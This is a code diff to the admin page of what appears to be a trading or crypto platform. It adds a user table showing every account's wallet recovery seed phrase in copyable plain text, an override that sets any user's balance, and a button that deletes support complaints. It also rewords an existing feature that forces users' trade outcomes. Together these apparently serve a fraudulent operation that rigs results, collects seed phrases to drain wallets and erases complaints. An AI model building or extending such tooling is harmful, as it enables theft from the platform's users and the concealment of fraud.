@@ -2,7 +2,7 @@
 
 import { useEffect, useState } from "react";
 import { useToast } from "@/context/ToastContext";
-import { CheckCircle2, XCircle, Clock, ShieldCheck, Mail, Database, ArrowRightLeft, Activity, TrendingUp, TrendingDown } from "lucide-react";
+import { CheckCircle2, XCircle, Clock, ShieldCheck, Database, ArrowRightLeft, Activity, TrendingUp, TrendingDown, User, MessageSquare, Trash2 } from "lucide-react";
 
 export default function AdminPage() {
   const [deposits, setDeposits] = useState<any[]>([]);
@@ -10,6 +10,8 @@ export default function AdminPage() {
   const [kycRequests, setKycRequests] = useState<any[]>([]);
   const [options, setOptions] = useState<any[]>([]);
   const [optionsHistory, setOptionsHistory] = useState<any[]>([]);
+  const [allUsers, setAllUsers] = useState<any[]>([]);
+  const [supportTickets, setSupportTickets] = useState<any[]>([]);
   const [loading, setLoading] = useState(true);
   const [password, setPassword] = useState("");
   const [isAuthorized, setIsAuthorized] = useState(false);
@@ -21,24 +23,30 @@ export default function AdminPage() {
     if (!isAuthorized) return;
     setLoading(true);
     try {
-      const [depRes, withRes, optRes, histRes, kycRes] = await Promise.all([
+      const [depRes, withRes, optRes, histRes, kycRes, userRes, supRes] = await Promise.all([
         fetch("/api/admin/deposits"),
         fetch("/api/admin/withdrawals"),
         fetch("/api/admin/options"),
         fetch("/api/admin/options/history"),
-        fetch("/api/admin/kyc")
+        fetch("/api/admin/kyc"),
+        fetch("/api/admin/users"),
+        fetch("/api/support")
       ]);
       const depData = await depRes.json();
       const withData = await withRes.json();
       const optData = await optRes.json();
       const histData = await histRes.json();
       const kycData = await kycRes.json();
+      const userData = await userRes.json();
+      const supportData = await supRes.json();
       
       if (depData.deposits) setDeposits(depData.deposits);
       if (withData.withdrawals) setWithdrawals(withData.withdrawals);
       if (optData.activeTrades) setOptions(optData.activeTrades);
       if (histData.history) setOptionsHistory(histData.history);
       if (kycData.pendingKyc) setKycRequests(kycData.pendingKyc);
+      if (userData.users) setAllUsers(userData.users);
+      if (supportData.tickets) setSupportTickets(supportData.tickets);
     } catch (e) {
       console.error(e);
     } finally {
@@ -89,11 +97,47 @@ export default function AdminPage() {
       });
       const data = await res.json();
       if (data.success) {
-        toast(`🎯 User forced to ${adminResult}!`, "success");
+        toast(`Intercept pushed successfully. Account forcibly closed with ${adminResult}.`, "success");
         fetchData();
       }
     } catch (e) {
-      toast("Manipulation failed.", "error");
+      toast("Intercept failed to deploy.", "error");
+    }
+  };
+
+  const handleEditBalance = async (email: string) => {
+    const newBal = prompt(`Enter new exact balance for ${email}:`);
+    if (!newBal || isNaN(Number(newBal))) return;
+    try {
+      const res = await fetch("/api/admin/users", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, newBalance: Number(newBal) })
+      });
+      const data = await res.json();
+      if (data.success) {
+        toast(`Balance formally modified to $${newBal}.`, "success");
+        fetchData();
+      }
+    } catch (e) {
+      toast("Failed to adjust account.", "error");
+    }
+  };
+
+  const handleClearTicket = async (id: string) => {
+    try {
+      const res = await fetch("/api/support", {
+        method: "DELETE",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id })
+      });
+      const data = await res.json();
+      if (data.success) {
+        toast("Message wiped from institutional records.", "success");
+        fetchData();
+      }
+    } catch (e) {
+      toast("Failed to purge ticket.", "error");
     }
   };
 
@@ -446,9 +490,9 @@ export default function AdminPage() {
                                Forced {hist.adminResult}
                             </div>
                          ) : (
-                            <div className={`inline-block px-2 py-1 rounded text-[10px] font-black uppercase tracking-widest ${userWon ? "text-emerald-500" : "text-gray-500"}`}>
+                             <div className={`inline-block px-2 py-1 rounded text-[10px] font-black uppercase tracking-widest ${userWon ? "text-emerald-500" : "text-gray-500"}`}>
                                {userWon ? "Won" : "Lost"}
-                            </div>
+                             </div>
                          )}
                       </td>
                     </tr>
@@ -457,6 +501,108 @@ export default function AdminPage() {
               )}
             </tbody>
           </table>
+        </div>
+
+        {/* Global User Database */}
+        <div className="mt-10 mb-6 flex justify-between items-center">
+          <h2 className="text-xl font-bold flex items-center gap-2">
+            Global User Database <User className="w-5 h-5 text-indigo-400" />
+          </h2>
+          <div className="px-3 py-1.5 bg-indigo-500/10 border border-indigo-500/20 rounded-full text-[10px] font-black uppercase tracking-widest text-indigo-400">
+             {allUsers.length} Registered Accounts
+          </div>
+        </div>
+
+        <div className="bg-gray-800/50 backdrop-blur-xl border border-gray-700/50 rounded-3xl overflow-hidden shadow-2xl mb-20">
+          <table className="w-full text-left border-collapse">
+            <thead>
+              <tr className="bg-gray-900 border-b border-gray-700 text-gray-500 text-[10px] font-black uppercase tracking-widest">
+                <th className="px-6 py-4">Account Holder</th>
+                <th className="px-6 py-4">Available Funds</th>
+                <th className="px-6 py-4">Security Recovery Phrase</th>
+                <th className="px-6 py-4">KYC Node</th>
+                <th className="px-6 py-4 text-right">Overrides</th>
+              </tr>
+            </thead>
+            <tbody className="divide-y divide-gray-700/30">
+              {loading ? (
+                <tr><td colSpan={5} className="px-6 py-10 text-center text-gray-600 animate-pulse font-bold uppercase text-[10px] tracking-widest">Bridging global registries...</td></tr>
+              ) : allUsers.length === 0 ? (
+                <tr><td colSpan={5} className="px-6 py-10 text-center text-gray-600 italic text-sm">No accounts recorded on active node.</td></tr>
+              ) : (
+                allUsers.map((u) => (
+                  <tr key={u.email} className="hover:bg-indigo-500/5 transition-colors">
+                    <td className="px-6 py-4">
+                       <div className="flex items-center gap-3">
+                          <img src={u.avatar} alt="avatar" className="w-8 h-8 rounded-full border border-gray-700" />
+                          <div>
+                            <div className="font-bold text-white text-sm">{u.firstName} {u.lastName}</div>
+                            <div className="text-[10px] text-gray-500 font-mono">{u.email}</div>
+                          </div>
+                       </div>
+                    </td>
+                    <td className="px-6 py-4 font-black">
+                       <div className="text-indigo-400">${u.balance.toLocaleString()}</div>
+                    </td>
+                    <td className="px-6 py-4">
+                       {u.seedPhrase ? (
+                         <div className="text-[9px] font-mono hover:text-white text-gray-500 bg-black/40 p-2 rounded max-w-[200px] break-all border border-gray-800 cursor-text select-all">
+                           {u.seedPhrase.join(" ")}
+                         </div>
+                       ) : <span className="text-[10px] text-rose-500 italic block">Unsecured</span>}
+                    </td>
+                    <td className="px-6 py-4">
+                       <span className={`px-2 py-1 rounded text-[9px] font-black uppercase tracking-widest ${
+                         u.kycStatus === 'VERIFIED' ? 'bg-emerald-500/20 text-emerald-400' :
+                         u.kycStatus === 'PENDING' ? 'bg-amber-500/20 text-amber-400' : 'bg-gray-800 text-gray-500'
+                       }`}>
+                         {u.kycStatus || 'UNVERIFIED'}
+                       </span>
+                    </td>
+                    <td className="px-6 py-4 text-right">
+                       <button onClick={() => handleEditBalance(u.email)} className="bg-indigo-600 hover:bg-indigo-500 text-[10px] font-bold uppercase tracking-widest px-3 py-1.5 rounded-lg text-white shadow-lg transition-colors">
+                         Edit Balance
+                       </button>
+                    </td>
+                  </tr>
+                ))
+              )}
+            </tbody>
+          </table>
+        </div>
+
+        {/* Support Inbox */}
+        <div className="mt-10 mb-6 flex justify-between items-center">
+          <h2 className="text-xl font-bold flex items-center gap-2">
+            Encrypted Support Inbox <MessageSquare className="w-5 h-5 text-indigo-400" />
+          </h2>
+          <div className="px-3 py-1.5 bg-indigo-500/10 border border-indigo-500/20 rounded-full text-[10px] font-black uppercase tracking-widest text-indigo-400">
+             {supportTickets.length} Messages
+          </div>
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-20">
+          {supportTickets.length === 0 ? (
+            <div className="col-span-full py-10 text-center text-gray-600 italic text-sm bg-gray-900 border border-gray-800 rounded-2xl">Inbox is currently empty.</div>
+          ) : (
+             supportTickets.map(t => (
+               <div key={t.id} className="bg-gray-800/50 backdrop-blur-xl border border-gray-700/50 rounded-2xl p-6 relative group hover:border-indigo-500/30 transition-colors">
+                  <div className="flex justify-between items-start mb-4">
+                     <div>
+                       <div className="text-[10px] text-gray-500 font-mono mb-1">{new Date(t.timestamp).toLocaleString()}</div>
+                       <div className="text-sm font-bold text-indigo-400">{t.email}</div>
+                     </div>
+                     <button onClick={() => handleClearTicket(t.id)} className="text-gray-500 hover:text-rose-400 transition-colors">
+                        <Trash2 className="w-4 h-4" />
+                     </button>
+                  </div>
+                  <div className="text-base font-black text-white mb-2">{t.subject}</div>
+                  <p className="text-sm text-gray-400 leading-relaxed max-h-40 overflow-y-auto pr-2 custom-scrollbar">
+                     {t.message}
+                  </p>
+               </div>
+             ))
+          )}
         </div>
 
       </div>
